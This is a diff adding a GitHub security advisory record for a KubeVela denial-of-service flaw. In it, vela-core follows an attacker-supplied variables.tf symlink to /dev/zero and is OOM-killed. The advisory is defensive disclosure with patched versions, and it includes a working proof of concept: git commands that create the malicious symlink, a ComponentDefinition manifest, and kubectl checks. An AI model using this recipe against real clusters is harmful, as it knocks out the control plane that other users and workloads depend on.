@@ -1,0 +1,123 @@
+{
+  "id": "GHSA-fmgp-q6jx-gg3x",
+  "modified": "2026-08-28T16:30:06.510623711Z",
+  "published": "2026-08-28T16:13:19Z",
+  "aliases": [
+    "CVE-2026-55108"
+  ],
+  "summary": "KubeVela Terraform remote loader DoS via unbounded file read",
+  "details": "### Summary\n\nKubeVela's Terraform remote configuration loader can be abused to make `vela-core` read an unbounded byte stream into memory, causing an out-of-memory kill and a control-plane denial of service.\n\nThe issue is reachable when a user with permission to create or update a `core.oam.dev/v1beta1` `ComponentDefinition` registers a Terraform `remote` schematic that points to a malicious or compromised git repository. The repository can contain a `variables.tf` symlink that resolves to `/dev/zero` after checkout. `vela-core` follows the symlink and calls `os.ReadFile` before HCL parsing, so memory grows until the controller is OOM killed.\n\n### Details\n\nThe affected code is in `pkg/controller/utils/capability.go`, inside `GetTerraformConfigurationFromRemote`:\n\nhttps://github.com/kubevela/kubevela/blob/a24d3a9c6/pkg/controller/utils/capability.go#L231-L242\n\n```go\ntfPath := filepath.Join(cachePath, remotePath, \"variables.tf\")\nif _, err := os.Stat(tfPath); err != nil {\n    tfPath = filepath.Join(cachePath, remotePath, \"main.tf\")\n    if _, err := os.Stat(tfPath); err != nil {\n        return \"\", errors.Wrap(err, \"failed to find main.tf or variables.tf in Terraform configurations of the remote repository\")\n    }\n}\nconf, err := os.ReadFile(filepath.Clean(tfPath))\nif err != nil {\n    return \"\", errors.Wrap(err, \"failed to read Terraform configuration\")\n}\n```\n\nWhen a `ComponentDefinition` uses:\n\n```yaml\nschematic:\n  terraform:\n    type: remote\n    configuration: \u003cgit repository URL\u003e\n```\n\nthe controller clones the user-supplied git repository and then reads `variables.tf` or `main.tf` from the checkout. The read path is built from attacker-controlled repository contents and `terraform.path`, but the code does not verify:\n\n- whether the target is a regular file;\n- whether the resolved path remains inside the clone cache;\n- how large the file is before reading it.\n\nBoth `os.Stat` and `os.ReadFile` follow symlinks. If the repository contains `variables.tf -\u003e ../../../../../../dev/zero`, then after checkout under the default cache path this symlink resolves to `/dev/zero`. `os.Stat` succeeds, and `os.ReadFile` reads from `/dev/zero`, which never returns EOF.\n\nThe failure happens during `os.ReadFile`, before the content reaches HCL parsing or `ParseTerraformVariables`, so later validation cannot prevent the OOM.\n\nThis vulnerability also has a path-traversal-like aspect, because symlinks and `terraform.path` can steer the read target outside the intended repository path. However, exposing arbitrary file contents would require the read data to pass HCL parsing before anything is written to a ConfigMap. Therefore, this report focuses on the availability impact caused by the unbounded read in `os.ReadFile` before HCL parsing, rather than a confidentiality impact.\n\n### PoC\n\nPrerequisites:\n\n- KubeVela is installed with the default configuration, for example in a kind cluster:\n\n```sh\nhelm install --create-namespace -n vela-system kubevela kubevela/vela-core --wait\n```\n\n- I reproduced this with `oamdev/vela-core:v1.10.8` and a `vela-core` memory limit of 1Gi.\n- The attacker has `create` / `update` permissions for `core.oam.dev/v1beta1` `ComponentDefinition` in any namespace.\n- The tester can create a git repository that `vela-core` can clone.\n\n1. Create a test git repository. In the repository root, add a relative `variables.tf` symlink that resolves to `/dev/zero` after checkout, then push it:\n\n```sh\ngit init poc-tf-dos \u0026\u0026 cd poc-tf-dos\nln -s ../../../../../../dev/zero variables.tf\ngit add variables.tf \u0026\u0026 git commit -m \"poc\"\ngit remote add origin https://github.com/\u003cYOUR_ORG\u003e/\u003cYOUR_REPO\u003e.git\ngit push -u origin main\n```\n\n2. Create `poc-componentdefinition.yaml`. Replace `configuration` with the repository URL from step 1:\n\n```yaml\napiVersion: core.oam.dev/v1beta1\nkind: ComponentDefinition\nmetadata:\n  name: dos-tf\n  namespace: vela-system\nspec:\n  workload:\n    definition:\n      apiVersion: apps/v1\n      kind: Deployment\n  schematic:\n    terraform:\n      type: remote\n      configuration: https://github.com/\u003cYOUR_ORG\u003e/\u003cYOUR_REPO\u003e.git\n      path: \"\"\n```\n\nThe workload GVK should reference a type that exists in the cluster, such as `apps/v1` `Deployment`.\n\n3. Apply the manifest and observe `vela-core`:\n\n```sh\nkubectl apply -f poc-componentdefinition.yaml\nkubectl -n vela-system get pods -l app.kubernetes.io/name=vela-core -w\n```\n\n4. Confirm the OOMKilled termination:\n\n```sh\nkubectl get pod -n vela-system -l app.kubernetes.io/name=vela-core \\\n  -o jsonpath='{.items[0].status.containerStatuses[0].lastState.terminated}{\"\\n\"}'\n```\n\nExpected result:\n\n```text\n\"exitCode\":137\n\"reason\":\"OOMKilled\"\n```\n\nThe pod may then enter `CrashLoopBackOff`.\n\nIf the reconcile fails with `stat .../main.tf: no such file or directory`, check that the symlink is relative and resolves to `/dev/zero` from the checkout location. If the same `ComponentDefinition` was already reconciled, remove the stale clone cache under `/root/.vela/terraform/\u003cname\u003e` and retry.\n\n### Impact\n\nThis is a denial-of-service vulnerability affecting KubeVela control-plane availability.\n\nA user who can create or update `ComponentDefinition` objects can cause the cluster-wide `vela-core` controller to be OOM killed. \n\nIf `vela-core` has a memory limit, the impact is likely contained to repeated OOMKilled restarts of the controller Pod. If no effective memory limit is configured, the unbounded read can also pressure node memory and affect other workloads running on the same node.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/oam-dev/kubevela",
+        "purl": "pkg:golang/github.com/oam-dev/kubevela"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.9.14"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/08/GHSA-fmgp-q6jx-gg3x/GHSA-fmgp-q6jx-gg3x.json"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/oam-dev/kubevela",
+        "purl": "pkg:golang/github.com/oam-dev/kubevela"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "1.10.0-alpha.1"
+            },
+            {
+              "fixed": "1.10.9"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/08/GHSA-fmgp-q6jx-gg3x/GHSA-fmgp-q6jx-gg3x.json"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/oam-dev/kubevela",
+        "purl": "pkg:golang/github.com/oam-dev/kubevela"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "1.11.0-alpha.1"
+            },
+            {
+              "fixed": "1.11.0-alpha.4"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/08/GHSA-fmgp-q6jx-gg3x/GHSA-fmgp-q6jx-gg3x.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/kubevela/kubevela/security/advisories/GHSA-fmgp-q6jx-gg3x"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/kubevela/kubevela/pull/7191"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/kubevela/kubevela/pull/7192"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/kubevela/kubevela/commit/65dedda40a69cc1eccf4072a4c835e5b9f13334e"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/kubevela/kubevela/commit/7a4e59b2958ce1cf031fafbc188d6fafe8fe4d2e"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/kubevela/kubevela/commit/f6a64398b5e0065c57c3a0fb6765dd3dc48c749d"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/kubevela/kubevela"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/kubevela/kubevela/releases/tag/v1.10.9"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/kubevela/kubevela/releases/tag/v1.11.0-alpha.4"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/kubevela/kubevela/releases/tag/v1.9.14"
+    }
+  ]
+}
